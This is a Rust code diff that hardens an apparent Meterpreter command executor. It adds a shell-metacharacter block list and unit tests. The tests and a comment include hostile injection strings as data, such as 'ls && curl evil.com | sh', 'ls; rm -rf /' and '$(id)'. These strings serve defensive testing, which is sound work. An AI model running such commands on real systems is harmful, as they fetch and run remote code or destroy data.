@@ -306,6 +306,18 @@ pub fn execute_meterpreter_command(cmd: &MeterpreterCommand) -> MeterpreterRespo
 
                 let trimmed = command.trim();
 
+                // Stage 1: Block shell metacharacters before any allowlist check.
+                // This prevents injection via "ls; curl evil|sh", "echo $(id)", etc.
+                if contains_shell_metachar(trimmed) {
+                    return MeterpreterResponse::failure(
+                        "exec",
+                        &format!(
+                            "Command rejected: shell metacharacters detected in '{}'",
+                            trimmed
+                        ),
+                    );
+                }
+
                 // Extract the base command for allowlist checking
                 let base_cmd = trimmed.split_whitespace().next().unwrap_or("");
                 let base_lower = base_cmd.to_lowercase();
@@ -432,5 +444,58 @@ pub fn execute_meterpreter_command(cmd: &MeterpreterCommand) -> MeterpreterRespo
             ),
         ),
         MeterpreterCommand::Exit => MeterpreterResponse::success("exit", "Session terminated"),
+    }
+}
+
+/// Returns true if the command string contains shell metacharacters that could
+/// be used to chain or inject additional commands.
+fn contains_shell_metachar(cmd: &str) -> bool {
+    // Check for characters/sequences that enable shell injection
+    let metachar_patterns = [";", "&&", "||", "|", "`", "$(", "<", ">", "\n", "\r"];
+    metachar_patterns.iter().any(|p| cmd.contains(p))
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn test_metachar_semicolon_blocked() {
+        assert!(contains_shell_metachar("ls; rm -rf /"));
+    }
+
+    #[test]
+    fn test_metachar_and_and_blocked() {
+        assert!(contains_shell_metachar("ls && curl evil.com | sh"));
+    }
+
+    #[test]
+    fn test_metachar_pipe_blocked() {
+        assert!(contains_shell_metachar("ls | sh"));
+    }
+
+    #[test]
+    fn test_metachar_subshell_blocked() {
+        assert!(contains_shell_metachar("echo $(id)"));
+    }
+
+    #[test]
+    fn test_metachar_backtick_blocked() {
+        assert!(contains_shell_metachar("cat `whoami`"));
+    }
+
+    #[test]
+    fn test_metachar_redirect_blocked() {
+        assert!(contains_shell_metachar("echo x > /tmp/f"));
+    }
+
+    #[test]
+    fn test_clean_command_passes() {
+        assert!(!contains_shell_metachar("ls /tmp"));
+    }
+
+    #[test]
+    fn test_clean_grep_passes() {
+        assert!(!contains_shell_metachar("grep foo bar.txt"));
     }
 }
